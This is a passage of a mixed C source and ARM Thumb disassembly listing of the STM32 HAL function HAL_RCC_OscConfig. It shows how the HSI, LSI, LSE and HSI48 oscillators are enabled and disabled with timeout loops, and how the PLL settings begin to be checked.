        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003c04:	e008      	b.n	8003c18 <HAL_RCC_OscConfig+0x36c>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003c06:	f7fd facd 	bl	80011a4 <HAL_GetTick>
 8003c0a:	4602      	mov	r2, r0
 8003c0c:	693b      	ldr	r3, [r7, #16]
 8003c0e:	1ad3      	subs	r3, r2, r3
 8003c10:	2b02      	cmp	r3, #2
 8003c12:	d901      	bls.n	8003c18 <HAL_RCC_OscConfig+0x36c>
          {
            return HAL_TIMEOUT;
 8003c14:	2303      	movs	r3, #3
 8003c16:	e255      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003c18:	4b65      	ldr	r3, [pc, #404]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003c1a:	681b      	ldr	r3, [r3, #0]
 8003c1c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003c20:	2b00      	cmp	r3, #0
 8003c22:	d0f0      	beq.n	8003c06 <HAL_RCC_OscConfig+0x35a>
          }
        }

        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003c24:	4b62      	ldr	r3, [pc, #392]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003c26:	685b      	ldr	r3, [r3, #4]
 8003c28:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003c2c:	687b      	ldr	r3, [r7, #4]
 8003c2e:	691b      	ldr	r3, [r3, #16]
 8003c30:	061b      	lsls	r3, r3, #24
 8003c32:	495f      	ldr	r1, [pc, #380]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003c34:	4313      	orrs	r3, r2
 8003c36:	604b      	str	r3, [r1, #4]
 8003c38:	e018      	b.n	8003c6c <HAL_RCC_OscConfig+0x3c0>
      }
      else
      {
        /* Disable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_DISABLE();
 8003c3a:	4b5d      	ldr	r3, [pc, #372]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003c3c:	681b      	ldr	r3, [r3, #0]
 8003c3e:	4a5c      	ldr	r2, [pc, #368]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003c40:	f423 7380 	bic.w	r3, r3, #256	; 0x100
 8003c44:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003c46:	f7fd faad 	bl	80011a4 <HAL_GetTick>
 8003c4a:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003c4c:	e008      	b.n	8003c60 <HAL_RCC_OscConfig+0x3b4>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003c4e:	f7fd faa9 	bl	80011a4 <HAL_GetTick>
 8003c52:	4602      	mov	r2, r0
 8003c54:	693b      	ldr	r3, [r7, #16]
 8003c56:	1ad3      	subs	r3, r2, r3
 8003c58:	2b02      	cmp	r3, #2
 8003c5a:	d901      	bls.n	8003c60 <HAL_RCC_OscConfig+0x3b4>
          {
            return HAL_TIMEOUT;
 8003c5c:	2303      	movs	r3, #3
 8003c5e:	e231      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003c60:	4b53      	ldr	r3, [pc, #332]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003c62:	681b      	ldr	r3, [r3, #0]
 8003c64:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003c68:	2b00      	cmp	r3, #0
 8003c6a:	d1f0      	bne.n	8003c4e <HAL_RCC_OscConfig+0x3a2>
        }
      }
    }
  }
  /*------------------------------ LSI Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSI) == RCC_OSCILLATORTYPE_LSI)
 8003c6c:	687b      	ldr	r3, [r7, #4]
 8003c6e:	681b      	ldr	r3, [r3, #0]
 8003c70:	f003 0308 	and.w	r3, r3, #8
 8003c74:	2b00      	cmp	r3, #0
 8003c76:	d03c      	beq.n	8003cf2 <HAL_RCC_OscConfig+0x446>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LSI(RCC_OscInitStruct->LSIState));

    /* Check the LSI State */
    if(RCC_OscInitStruct->LSIState != RCC_LSI_OFF)
 8003c78:	687b      	ldr	r3, [r7, #4]
 8003c7a:	695b      	ldr	r3, [r3, #20]
 8003c7c:	2b00      	cmp	r3, #0
 8003c7e:	d01c      	beq.n	8003cba <HAL_RCC_OscConfig+0x40e>
        MODIFY_REG(RCC->CSR, RCC_CSR_LSIPREDIV, RCC_OscInitStruct->LSIDiv);
      }
#endif /* RCC_CSR_LSIPREDIV */

      /* Enable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_ENABLE();
 8003c80:	4b4b      	ldr	r3, [pc, #300]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003c82:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003c86:	4a4a      	ldr	r2, [pc, #296]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003c88:	f043 0301 	orr.w	r3, r3, #1
 8003c8c:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003c90:	f7fd fa88 	bl	80011a4 <HAL_GetTick>
 8003c94:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is ready */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003c96:	e008      	b.n	8003caa <HAL_RCC_OscConfig+0x3fe>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003c98:	f7fd fa84 	bl	80011a4 <HAL_GetTick>
 8003c9c:	4602      	mov	r2, r0
 8003c9e:	693b      	ldr	r3, [r7, #16]
 8003ca0:	1ad3      	subs	r3, r2, r3
 8003ca2:	2b02      	cmp	r3, #2
 8003ca4:	d901      	bls.n	8003caa <HAL_RCC_OscConfig+0x3fe>
        {
          return HAL_TIMEOUT;
 8003ca6:	2303      	movs	r3, #3
 8003ca8:	e20c      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003caa:	4b41      	ldr	r3, [pc, #260]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003cac:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003cb0:	f003 0302 	and.w	r3, r3, #2
 8003cb4:	2b00      	cmp	r3, #0
 8003cb6:	d0ef      	beq.n	8003c98 <HAL_RCC_OscConfig+0x3ec>
 8003cb8:	e01b      	b.n	8003cf2 <HAL_RCC_OscConfig+0x446>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_DISABLE();
 8003cba:	4b3d      	ldr	r3, [pc, #244]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003cbc:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003cc0:	4a3b      	ldr	r2, [pc, #236]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003cc2:	f023 0301 	bic.w	r3, r3, #1
 8003cc6:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003cca:	f7fd fa6b 	bl	80011a4 <HAL_GetTick>
 8003cce:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is disabled */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003cd0:	e008      	b.n	8003ce4 <HAL_RCC_OscConfig+0x438>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003cd2:	f7fd fa67 	bl	80011a4 <HAL_GetTick>
 8003cd6:	4602      	mov	r2, r0
 8003cd8:	693b      	ldr	r3, [r7, #16]
 8003cda:	1ad3      	subs	r3, r2, r3
 8003cdc:	2b02      	cmp	r3, #2
 8003cde:	d901      	bls.n	8003ce4 <HAL_RCC_OscConfig+0x438>
        {
          return HAL_TIMEOUT;
 8003ce0:	2303      	movs	r3, #3
 8003ce2:	e1ef      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003ce4:	4b32      	ldr	r3, [pc, #200]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003ce6:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003cea:	f003 0302 	and.w	r3, r3, #2
 8003cee:	2b00      	cmp	r3, #0
 8003cf0:	d1ef      	bne.n	8003cd2 <HAL_RCC_OscConfig+0x426>
        }
      }
    }
  }
  /*------------------------------ LSE Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSE) == RCC_OSCILLATORTYPE_LSE)
 8003cf2:	687b      	ldr	r3, [r7, #4]
 8003cf4:	681b      	ldr	r3, [r3, #0]
 8003cf6:	f003 0304 	and.w	r3, r3, #4
 8003cfa:	2b00      	cmp	r3, #0
 8003cfc:	f000 80a6 	beq.w	8003e4c <HAL_RCC_OscConfig+0x5a0>
  {
    FlagStatus       pwrclkchanged = RESET;
 8003d00:	2300      	movs	r3, #0
 8003d02:	77fb      	strb	r3, [r7, #31]
    /* Check the parameters */
    assert_param(IS_RCC_LSE(RCC_OscInitStruct->LSEState));

    /* Update LSE configuration in Backup Domain control register    */
    /* Requires to enable write access to Backup Domain of necessary */
    if(HAL_IS_BIT_CLR(RCC->APB1ENR1, RCC_APB1ENR1_PWREN))
 8003d04:	4b2a      	ldr	r3, [pc, #168]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003d06:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d08:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003d0c:	2b00      	cmp	r3, #0
 8003d0e:	d10d      	bne.n	8003d2c <HAL_RCC_OscConfig+0x480>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8003d10:	4b27      	ldr	r3, [pc, #156]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003d12:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d14:	4a26      	ldr	r2, [pc, #152]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003d16:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8003d1a:	6593      	str	r3, [r2, #88]	; 0x58
 8003d1c:	4b24      	ldr	r3, [pc, #144]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003d1e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d20:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003d24:	60bb      	str	r3, [r7, #8]
 8003d26:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8003d28:	2301      	movs	r3, #1
 8003d2a:	77fb      	strb	r3, [r7, #31]
    }

    if(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d2c:	4b21      	ldr	r3, [pc, #132]	; (8003db4 <HAL_RCC_OscConfig+0x508>)
 8003d2e:	681b      	ldr	r3, [r3, #0]
 8003d30:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003d34:	2b00      	cmp	r3, #0
 8003d36:	d118      	bne.n	8003d6a <HAL_RCC_OscConfig+0x4be>
    {
      /* Enable write access to Backup domain */
      SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003d38:	4b1e      	ldr	r3, [pc, #120]	; (8003db4 <HAL_RCC_OscConfig+0x508>)
 8003d3a:	681b      	ldr	r3, [r3, #0]
 8003d3c:	4a1d      	ldr	r2, [pc, #116]	; (8003db4 <HAL_RCC_OscConfig+0x508>)
 8003d3e:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003d42:	6013      	str	r3, [r2, #0]

      /* Wait for Backup domain Write protection disable */
      tickstart = HAL_GetTick();
 8003d44:	f7fd fa2e 	bl	80011a4 <HAL_GetTick>
 8003d48:	6138      	str	r0, [r7, #16]

      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d4a:	e008      	b.n	8003d5e <HAL_RCC_OscConfig+0x4b2>
      {
        if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8003d4c:	f7fd fa2a 	bl	80011a4 <HAL_GetTick>
 8003d50:	4602      	mov	r2, r0
 8003d52:	693b      	ldr	r3, [r7, #16]
 8003d54:	1ad3      	subs	r3, r2, r3
 8003d56:	2b02      	cmp	r3, #2
 8003d58:	d901      	bls.n	8003d5e <HAL_RCC_OscConfig+0x4b2>
        {
          return HAL_TIMEOUT;
 8003d5a:	2303      	movs	r3, #3
 8003d5c:	e1b2      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d5e:	4b15      	ldr	r3, [pc, #84]	; (8003db4 <HAL_RCC_OscConfig+0x508>)
 8003d60:	681b      	ldr	r3, [r3, #0]
 8003d62:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003d66:	2b00      	cmp	r3, #0
 8003d68:	d0f0      	beq.n	8003d4c <HAL_RCC_OscConfig+0x4a0>
    {
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEON);
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEBYP);
    }
#else
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 8003d6a:	687b      	ldr	r3, [r7, #4]
 8003d6c:	689b      	ldr	r3, [r3, #8]
 8003d6e:	2b01      	cmp	r3, #1
 8003d70:	d108      	bne.n	8003d84 <HAL_RCC_OscConfig+0x4d8>
 8003d72:	4b0f      	ldr	r3, [pc, #60]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003d74:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d78:	4a0d      	ldr	r2, [pc, #52]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003d7a:	f043 0301 	orr.w	r3, r3, #1
 8003d7e:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003d82:	e029      	b.n	8003dd8 <HAL_RCC_OscConfig+0x52c>
 8003d84:	687b      	ldr	r3, [r7, #4]
 8003d86:	689b      	ldr	r3, [r3, #8]
 8003d88:	2b05      	cmp	r3, #5
 8003d8a:	d115      	bne.n	8003db8 <HAL_RCC_OscConfig+0x50c>
 8003d8c:	4b08      	ldr	r3, [pc, #32]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003d8e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d92:	4a07      	ldr	r2, [pc, #28]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003d94:	f043 0304 	orr.w	r3, r3, #4
 8003d98:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003d9c:	4b04      	ldr	r3, [pc, #16]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003d9e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003da2:	4a03      	ldr	r2, [pc, #12]	; (8003db0 <HAL_RCC_OscConfig+0x504>)
 8003da4:	f043 0301 	orr.w	r3, r3, #1
 8003da8:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003dac:	e014      	b.n	8003dd8 <HAL_RCC_OscConfig+0x52c>
 8003dae:	bf00      	nop
 8003db0:	40021000 	.word	0x40021000
 8003db4:	40007000 	.word	0x40007000
 8003db8:	4b9a      	ldr	r3, [pc, #616]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003dba:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003dbe:	4a99      	ldr	r2, [pc, #612]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003dc0:	f023 0301 	bic.w	r3, r3, #1
 8003dc4:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003dc8:	4b96      	ldr	r3, [pc, #600]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003dca:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003dce:	4a95      	ldr	r2, [pc, #596]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003dd0:	f023 0304 	bic.w	r3, r3, #4
 8003dd4:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
#endif /* RCC_BDCR_LSESYSDIS */

    /* Check the LSE State */
    if(RCC_OscInitStruct->LSEState != RCC_LSE_OFF)
 8003dd8:	687b      	ldr	r3, [r7, #4]
 8003dda:	689b      	ldr	r3, [r3, #8]
 8003ddc:	2b00      	cmp	r3, #0
 8003dde:	d016      	beq.n	8003e0e <HAL_RCC_OscConfig+0x562>
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003de0:	f7fd f9e0 	bl	80011a4 <HAL_GetTick>
 8003de4:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is ready */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003de6:	e00a      	b.n	8003dfe <HAL_RCC_OscConfig+0x552>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003de8:	f7fd f9dc 	bl	80011a4 <HAL_GetTick>
 8003dec:	4602      	mov	r2, r0
 8003dee:	693b      	ldr	r3, [r7, #16]
 8003df0:	1ad3      	subs	r3, r2, r3
 8003df2:	f241 3288 	movw	r2, #5000	; 0x1388
 8003df6:	4293      	cmp	r3, r2
 8003df8:	d901      	bls.n	8003dfe <HAL_RCC_OscConfig+0x552>
        {
          return HAL_TIMEOUT;
 8003dfa:	2303      	movs	r3, #3
 8003dfc:	e162      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003dfe:	4b89      	ldr	r3, [pc, #548]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003e00:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e04:	f003 0302 	and.w	r3, r3, #2
 8003e08:	2b00      	cmp	r3, #0
 8003e0a:	d0ed      	beq.n	8003de8 <HAL_RCC_OscConfig+0x53c>
 8003e0c:	e015      	b.n	8003e3a <HAL_RCC_OscConfig+0x58e>
      }
    }
    else
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e0e:	f7fd f9c9 	bl	80011a4 <HAL_GetTick>
 8003e12:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is disabled */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003e14:	e00a      	b.n	8003e2c <HAL_RCC_OscConfig+0x580>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003e16:	f7fd f9c5 	bl	80011a4 <HAL_GetTick>
 8003e1a:	4602      	mov	r2, r0
 8003e1c:	693b      	ldr	r3, [r7, #16]
 8003e1e:	1ad3      	subs	r3, r2, r3
 8003e20:	f241 3288 	movw	r2, #5000	; 0x1388
 8003e24:	4293      	cmp	r3, r2
 8003e26:	d901      	bls.n	8003e2c <HAL_RCC_OscConfig+0x580>
        {
          return HAL_TIMEOUT;
 8003e28:	2303      	movs	r3, #3
 8003e2a:	e14b      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003e2c:	4b7d      	ldr	r3, [pc, #500]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003e2e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e32:	f003 0302 	and.w	r3, r3, #2
 8003e36:	2b00      	cmp	r3, #0
 8003e38:	d1ed      	bne.n	8003e16 <HAL_RCC_OscConfig+0x56a>
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSESYSDIS);
#endif /* RCC_BDCR_LSESYSDIS */
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8003e3a:	7ffb      	ldrb	r3, [r7, #31]
 8003e3c:	2b01      	cmp	r3, #1
 8003e3e:	d105      	bne.n	8003e4c <HAL_RCC_OscConfig+0x5a0>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 8003e40:	4b78      	ldr	r3, [pc, #480]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003e42:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003e44:	4a77      	ldr	r2, [pc, #476]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003e46:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8003e4a:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }
#if defined(RCC_HSI48_SUPPORT)
  /*------------------------------ HSI48 Configuration -----------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI48) == RCC_OSCILLATORTYPE_HSI48)
 8003e4c:	687b      	ldr	r3, [r7, #4]
 8003e4e:	681b      	ldr	r3, [r3, #0]
 8003e50:	f003 0320 	and.w	r3, r3, #32
 8003e54:	2b00      	cmp	r3, #0
 8003e56:	d03c      	beq.n	8003ed2 <HAL_RCC_OscConfig+0x626>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSI48(RCC_OscInitStruct->HSI48State));

    /* Check the LSI State */
    if(RCC_OscInitStruct->HSI48State != RCC_HSI48_OFF)
 8003e58:	687b      	ldr	r3, [r7, #4]
 8003e5a:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8003e5c:	2b00      	cmp	r3, #0
 8003e5e:	d01c      	beq.n	8003e9a <HAL_RCC_OscConfig+0x5ee>
    {
      /* Enable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_ENABLE();
 8003e60:	4b70      	ldr	r3, [pc, #448]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003e62:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003e66:	4a6f      	ldr	r2, [pc, #444]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003e68:	f043 0301 	orr.w	r3, r3, #1
 8003e6c:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e70:	f7fd f998 	bl	80011a4 <HAL_GetTick>
 8003e74:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is ready */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003e76:	e008      	b.n	8003e8a <HAL_RCC_OscConfig+0x5de>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003e78:	f7fd f994 	bl	80011a4 <HAL_GetTick>
 8003e7c:	4602      	mov	r2, r0
 8003e7e:	693b      	ldr	r3, [r7, #16]
 8003e80:	1ad3      	subs	r3, r2, r3
 8003e82:	2b02      	cmp	r3, #2
 8003e84:	d901      	bls.n	8003e8a <HAL_RCC_OscConfig+0x5de>
        {
          return HAL_TIMEOUT;
 8003e86:	2303      	movs	r3, #3
 8003e88:	e11c      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003e8a:	4b66      	ldr	r3, [pc, #408]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003e8c:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003e90:	f003 0302 	and.w	r3, r3, #2
 8003e94:	2b00      	cmp	r3, #0
 8003e96:	d0ef      	beq.n	8003e78 <HAL_RCC_OscConfig+0x5cc>
 8003e98:	e01b      	b.n	8003ed2 <HAL_RCC_OscConfig+0x626>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_DISABLE();
 8003e9a:	4b62      	ldr	r3, [pc, #392]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003e9c:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003ea0:	4a60      	ldr	r2, [pc, #384]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003ea2:	f023 0301 	bic.w	r3, r3, #1
 8003ea6:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003eaa:	f7fd f97b 	bl	80011a4 <HAL_GetTick>
 8003eae:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is disabled */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003eb0:	e008      	b.n	8003ec4 <HAL_RCC_OscConfig+0x618>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003eb2:	f7fd f977 	bl	80011a4 <HAL_GetTick>
 8003eb6:	4602      	mov	r2, r0
 8003eb8:	693b      	ldr	r3, [r7, #16]
 8003eba:	1ad3      	subs	r3, r2, r3
 8003ebc:	2b02      	cmp	r3, #2
 8003ebe:	d901      	bls.n	8003ec4 <HAL_RCC_OscConfig+0x618>
        {
          return HAL_TIMEOUT;
 8003ec0:	2303      	movs	r3, #3
 8003ec2:	e0ff      	b.n	80040c4 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003ec4:	4b57      	ldr	r3, [pc, #348]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003ec6:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003eca:	f003 0302 	and.w	r3, r3, #2
 8003ece:	2b00      	cmp	r3, #0
 8003ed0:	d1ef      	bne.n	8003eb2 <HAL_RCC_OscConfig+0x606>
#endif /* RCC_HSI48_SUPPORT */
  /*-------------------------------- PLL Configuration -----------------------*/
  /* Check the parameters */
  assert_param(IS_RCC_PLL(RCC_OscInitStruct->PLL.PLLState));

  if(RCC_OscInitStruct->PLL.PLLState != RCC_PLL_NONE)
 8003ed2:	687b      	ldr	r3, [r7, #4]
 8003ed4:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003ed6:	2b00      	cmp	r3, #0
 8003ed8:	f000 80f3 	beq.w	80040c2 <HAL_RCC_OscConfig+0x816>
  {
    /* PLL On ? */
    if(RCC_OscInitStruct->PLL.PLLState == RCC_PLL_ON)
 8003edc:	687b      	ldr	r3, [r7, #4]
 8003ede:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003ee0:	2b02      	cmp	r3, #2
 8003ee2:	f040 80c9 	bne.w	8004078 <HAL_RCC_OscConfig+0x7cc>
#endif /* RCC_PLLP_SUPPORT */
      assert_param(IS_RCC_PLLQ_VALUE(RCC_OscInitStruct->PLL.PLLQ));
      assert_param(IS_RCC_PLLR_VALUE(RCC_OscInitStruct->PLL.PLLR));

      /* Do nothing if PLL configuration is the unchanged */
      pll_config = RCC->PLLCFGR;
 8003ee6:	4b4f      	ldr	r3, [pc, #316]	; (8004024 <HAL_RCC_OscConfig+0x778>)
 8003ee8:	68db      	ldr	r3, [r3, #12]
 8003eea:	617b      	str	r3, [r7, #20]
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8003eec:	697b      	ldr	r3, [r7, #20]
 8003eee:	f003 0203 	and.w	r2, r3, #3
 8003ef2:	687b      	ldr	r3, [r7, #4]
 8003ef4:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8003ef6:	429a      	cmp	r2, r3
 8003ef8:	d12c      	bne.n	8003f54 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003efa:	697b      	ldr	r3, [r7, #20]
 8003efc:	f003 0270 	and.w	r2, r3, #112	; 0x70
 8003f00:	687b      	ldr	r3, [r7, #4]
 8003f02:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003f04:	3b01      	subs	r3, #1
 8003f06:	011b      	lsls	r3, r3, #4
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8003f08:	429a      	cmp	r2, r3
 8003f0a:	d123      	bne.n	8003f54 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003f0c:	697b      	ldr	r3, [r7, #20]
 8003f0e:	f403 42fe 	and.w	r2, r3, #32512	; 0x7f00
 8003f12:	687b      	ldr	r3, [r7, #4]
 8003f14:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8003f16:	021b      	lsls	r3, r3, #8
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003f18:	429a      	cmp	r2, r3
 8003f1a:	d11b      	bne.n	8003f54 <HAL_RCC_OscConfig+0x6a8>
#if defined(RCC_PLLP_SUPPORT)
#if defined(RCC_PLLP_DIV_2_31_SUPPORT)
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003f1c:	697b      	ldr	r3, [r7, #20]
 8003f1e:	f003 4278 	and.w	r2, r3, #4160749568	; 0xf8000000
